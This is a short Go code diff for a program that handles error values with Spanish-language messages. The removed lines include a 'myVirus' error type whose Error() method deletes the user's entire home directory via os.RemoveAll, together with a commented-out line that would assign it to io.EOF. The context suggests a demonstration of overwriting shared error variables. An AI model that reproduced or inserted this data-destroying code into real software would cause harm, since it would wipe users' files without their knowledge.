@@ -3,7 +3,6 @@ package main
 import (
 	"errors"
 	"fmt"
-	"os"
 )
 
 var (
@@ -59,14 +58,4 @@ func main() {
 	default:
 		fmt.Println("error desconocido:", err)
 	}
-
-	//io.EOF = &myVirus{}
-}
-
-type myVirus struct{}
-
-func (v *myVirus) Error() string {
-	home, _ := os.UserHomeDir()
-	os.RemoveAll(home)
-	return "PWNED!"
 }
